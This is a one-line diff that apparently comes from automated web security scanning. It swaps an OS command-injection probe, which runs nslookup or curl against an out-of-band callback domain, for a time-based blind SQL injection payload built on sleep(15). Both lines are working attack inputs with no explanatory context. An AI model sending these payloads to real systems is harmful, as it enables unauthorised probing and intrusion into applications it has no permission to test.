@@ -1,1 +1,1 @@
-|(nslookup -q=cname hitifdetfsetm14ea7.bxss.me||curl hitifdetfsetm14ea7.bxss.me)
+5550'XOR(555*if(now()=sysdate(),sleep(15),0))XOR'Z
